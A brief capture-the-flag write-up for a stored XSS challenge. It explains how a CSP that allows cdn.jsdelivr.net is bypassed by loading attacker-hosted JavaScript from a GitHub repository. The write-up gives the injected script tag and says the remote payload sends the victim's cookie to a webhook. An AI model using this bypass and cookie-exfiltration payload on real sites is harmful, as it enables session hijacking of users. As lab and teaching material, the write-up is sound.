# Writeup Notes

This would be your typical XSS challenge since the name gets directly stored in the SQL database and printed out to the screen, but there's a relatively strict CSP. CSP refers to the Content Security Policy which governs what JavaScript is actually supposed to run. 

```html
Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net ; 
                         style-src 'self' https://fonts.googleapis.com; 
                         img-src 'self'; font-src 'self' https://fonts.gstatic.com; 
                         child-src 'self'; 
                         frame-src 'self'; 
                         worker-src 'self'; 
                         frame-ancestors 'self'; 
                         form-action 'self'; 
                         base-uri 'self'; 
                         manifest-src 'self'
```

As it turns out, the jsdelivr CDN actually can be used to import files from any Github repository. So, create a new github repo, host a javascript file with your payload, and then set your name to be:
```html
<script src="https://cdn.jsdelivr.net/gh/An00bRektn/test@main/payload.js" onload></script>
```

and you should get a callback at your webhook. The `payload.js` file here will exfiltrate the cookie in base64, so just decode the base64 and stick the cookie in [`jwt.io`](https://jwt.io) to see the flag (because it was in the cookie).